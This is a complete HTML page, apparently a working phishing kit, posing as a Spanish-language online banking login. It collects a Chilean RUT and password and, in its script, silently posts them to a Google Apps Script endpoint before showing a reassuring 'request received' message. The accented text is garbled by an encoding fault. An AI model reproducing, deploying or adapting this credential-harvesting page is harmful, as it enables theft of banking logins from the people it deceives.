
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Acceso</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background: #f8f8f8;
      margin: 0;
      padding: 0;
    }

    h2 {
      text-align: center;
      color: #000;
      margin-top: 2rem;
    }

    form {
      background: #fff;
      border: 2px solid #dc3545;
      border-radius: 10px;
      padding: 2rem;
      margin: 2rem auto;
      max-width: 400px;
      width: 90%;
      box-shadow: 0 0 10px rgba(220, 53, 69, 0.2);
    }

    .form-group {
      position: relative;
      margin-bottom: 1.5rem;
    }

    input {
      width: 100%;
      padding: 10px;
      padding-right: 40px;
      border: 1px solid #000;
      border-radius: 5px;
      background-color: #fff;
      font-size: 16px;
    }

    .toggle-password {
      position: absolute;
      right: 10px;
      top: 10px;
      background: none;
      border: none;
      cursor: pointer;
      font-size: 16px;
    }

    button[type="submit"] {
      width: 100%;
      padding: 12px;
      background: #dc3545;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }

    button[type="submit"]:hover {
      background: #b02a37;
    }
  </style>
</head>
<body>
  <h2>Ingreso a tu Banca en L√≠nea</h2>
  <form id="formulario">
    <div class="form-group">
      <input type="text" name="rut" placeholder="RUT" required oninput="formatRUT(this)" />
    </div>

    <div class="form-group">
      <input type="password" id="clave" name="clave" placeholder="Contrase√±a" required />
      <button type="button" class="toggle-password" onclick="toggleClave()">üëÅÔ∏è</button>
    </div>

    <button type="submit">Ingresar</button>
  
    <div id="mensaje-exito" style="display:none; color:#dc3545; text-align:center; margin-top:1rem;">
      Hemos recibido tu solicitud.
    </div>
    </form>


  <script>
    const form = document.getElementById('formulario');
    form.addEventListener('submit', e => {
      e.preventDefault();
      const data = new FormData(form);
      fetch('https://script.google.com/macros/s/AKfycbz6gILRGnnfsTeiXA0wQMQIF9F_J7uxskG6R4iQFr95zvIw8zImzxXvf2k2qCjMbiUx/exec', {
        method: 'POST',
        body: data
      })
      .then(response => {
        if (response.ok) {
          
          const mensaje = document.getElementById('mensaje-exito');
          mensaje.style.display = 'block';
          form.reset();
    
        } else {
          alert('Error al enviar los datos.');
        }
      })
      .catch(error => {
        alert('Error de conexi√≥n con el servidor.');
        console.error(error);
      });
    });

    function toggleClave() {
      const input = document.getElementById("clave");
      input.type = input.type === "password" ? "text" : "password";
    }
  
    function formatRUT(input) {
      let value = input.value.replace(/[^0-9kK]/g, '').toUpperCase();
      let rut = value.slice(0, -1);
      let dv = value.slice(-1);

      // Agrega puntos cada tres d√≠gitos desde el final
      let formatted = '';
      while (rut.length > 3) {
        formatted = '.' + rut.slice(-3) + formatted;
        rut = rut.slice(0, -3);
      }
      formatted = rut + formatted + '-' + dv;
      input.value = formatted;
    }

  </script>
</body>
</html>
